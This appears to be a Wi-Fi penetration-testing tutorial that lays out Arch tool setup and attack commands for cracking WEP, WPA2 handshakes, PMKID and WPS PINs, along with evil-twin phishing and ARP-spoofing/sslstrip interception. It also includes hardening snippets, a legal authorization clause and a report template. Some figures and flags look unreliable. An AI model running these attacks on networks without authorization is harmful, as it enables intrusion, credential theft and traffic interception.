## **1. Understanding Wi-Fi Security Protocols**
### **Protocol Evolution & Vulnerabilities**
| Protocol | Year | Encryption | Vulnerabilities          | Crackability     |
| -------- | ---- | ---------- | ------------------------ | ---------------- |
| WEP      | 1997 | RC4        | IV Collisions, Weak Keys | 100% (Minutes)   |
| WPA      | 2003 | TKIP/RC4   | WPA-TKIP Attacks         | 95% (Hours)      |
| WPA2     | 2004 | CCMP/AES   | KRACK, PMKID             | 70% (Dictionary) |
| WPA3     | 2018 | GCMP/SAE   | Dragonblood              | 30% (Advanced)   |

**Key Insight:** Always prioritize WPA3/WPA2-Enterprise over personal PSK when possible.

## **2. Essential Tools Setup**
### **Hardware Requirements**
- **Recommended Adapters**:
	- Alfa AWUS036ACH (802.11ac)
- **Antennas**: 
	- Alfa ARS-N19 (Indoor/All-Around)
	- Alfa APA-M25 (Outdoor/Targeted)
- USB 3.0 Extension + Mount

### **Arch Preparation**
```bash
sudo pacman -Sy aircrack-ng hashcat hcxdumptool bully reaver
sudo systemctl stop NetworkManager
sudo airmon-ng check kill
```

## 3. Identify Target
### Using `airodump-ng`
```bash
sudo airodump-ng wlan0mon
```
- Look under the **"Prot"** or **"ENC"** column.
- It shows things like:
    - `WPA2` – encryption
    - `CCMP` – cipher
    - But for protocol version: check **channel width and speed** too.
- Combine with the **"HT"** / **"VHT"** / **"HE"** flags:
    - `HT` → **802.11n**
    - `VHT` → **802.11ac**
    - `HE` → **802.11ax (Wi-Fi 6)**

### Using `iw dev` and `iwlist`
```bash
iw dev wlan0 scan | grep -A 20 'SSID: TargetWiFi'
```
Look for:
- `HT capabilities:` → 802.11n
- `VHT capabilities:` → 802.11ac
- `HE capabilities:` → 802.11ax

## **4. Attack Methodology**

### **A. WEP Cracking (Obsolete but Found in Legacy Systems)**
```bash
# Step 1: Put interface in monitor mode
sudo airmon-ng start wlan0

# Step 2: Capture IVs (Packet Injection Recommended)
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# Step 3: Crack with aircrack
aircrack-ng -b 00:11:22:33:44:55 capture-01.cap
```
**Time Estimate**: 2-15 minutes with active traffic

### **B. WPA/WPA2 PSK Attacks**

#### **1. Handshake Capture**
```bash
# Capture beacon frames
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w handshake wlan0mon

# Deauth to force handshake
sudo aireplay-ng -0 5 -a 00:11:22:33:44:55 -c ClientMAC wlan0mon

# Verify handshake
aircrack-ng -J verify handshake-01.cap
```

#### **2. Dictionary Attack**
```bash
# Using aircrack
aircrack-ng -w rockyou.txt handshake-01.cap

# Using hashcat (faster)
hcxpcapngtool -o hash.hc22000 handshake-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

#### **3. PMKID Attack (No Clients Needed)**
```bash
sudo hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
hcxpcapngtool -z pmkid.hash capture.pcapng
hashcat -m 16800 pmkid.hash -a 3 ?d?d?d?d?d?d?d?d
```

### **C. WPA3 Attack Surface**
**Dragonblood Vulnerabilities**:
- SAE side-channel attacks
- Downgrade to WPA2

```bash
sudo dragonforce -i wlan0mon -b 00:11:22:33:44:55 -w wordlist.txt
```

## **5. Advanced Techniques**

### **A. Evil Twin Attacks**
```bash
# Create rogue AP
sudo airbase-ng -a 00:11:22:33:44:55 --essid "FreeWiFi" -c 6 wlan0mon

# Phishing portal integration
sudo dnsmasq -C dnsmasq.conf
sudo hostapd hostapd.conf
```

### **B. WPS PIN Attacks**
```bash
# Using reaver
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -K 1

# Using bully (faster)
bully -b 00:11:22:33:44:55 wlan0mon -p 12345670
```

## **6. Defense Strategies**

### **Enterprise Best Practices**
```bash
# RADIUS Configuration Example (FreeRADIUS)
eap {
    default_eap_type = peap
    timer_expire = 60
    ignore_unknown_eap_types = no
}
```

### **Personal Network Hardening**
```bash
# Hostapd Config Snippet
wpa=2
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
wpa_passphrase=ComplexP@ssw0rd!
```

## **7. Legal Considerations**

**Always obtain written permission** before testing any network. Recommended legal clause:
```
This assessment is authorized by {Organization} from {StartDate} to {EndDate}.
Testing limited to SSIDs: {List_of_SSIDs}.
All activities logged for audit purposes.
```

## **8. Post-Exploitation**

### **Network Mapping**
```bash
nmap -Pn -sV -O 192.168.1.0/24
```

### **MITM Techniques**
```bash
sudo arpspoof -i wlan0 -t 192.168.1.100 192.168.1.1
sudo sslstrip -l 8080
```

## **9. Reporting Template**

**Findings Summary**:
```
1. WPA2-PSK Vulnerability (Critical)
   - Captured handshake in 2 minutes
   - Cracked password in 4 hours (8-char lowercase)

2. WPS Enabled (High)
   - PIN brute-forced in 6 hours

3. Rogue AP Detection (Medium)
   - No enterprise authentication observed
```

**Remediation Plan**:
1. Migrate to WPA3-Enterprise with 802.1X
2. Disable WPS immediately
3. Implement wireless intrusion detection
